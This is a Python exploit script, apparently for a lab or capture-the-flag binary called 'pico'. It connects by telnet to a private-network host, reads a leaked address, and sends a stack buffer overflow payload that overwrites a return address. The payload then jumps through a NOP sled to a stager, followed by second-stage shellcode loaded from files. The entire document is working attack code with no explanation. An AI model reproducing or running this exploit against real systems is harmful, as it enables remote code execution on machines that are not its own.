import telnetlib
import time
import struct


ip_adress = '192.168.139.1'
port_no = 22222


def pI(addr):
    return struct.pack('<I', addr)


def exploit(tn):

    s = tn.get_socket()

    with open('stager', 'rb') as f:
        stager = f.read()

    with open('shellcode_pico', 'rb') as f:
        sc = f.read()

    s.send(b'./pico\n')
    time.sleep(0.5)

    tn.read_until(b'addr: ')

    addr_pass = int(tn.read_until(b'\n')[:-1], 16)
    print('Address of Pass : {0}'.format(hex(addr_pass)))

    payload = b'A'*0x1c
    payload += pI(addr_pass + 0x20 + 8)
    payload += b'\x90' * 0x30
    payload += stager

    # user
    s.send(payload + b'\n')

    time.sleep(0.5)

    # pass
    #s.send(b'A\n')
    s.send(b'A\n')

    payload2 = b''
    payload2 += b'\x90' * 0x30
    payload2 += sc

    #payload2 += b'A\n'

    s.send(payload2)

    print(s.recv(2048))


def main():

    tn = telnetlib.Telnet(ip_adress, port_no)
    exploit(tn)


if __name__ == '__main__':
    main()


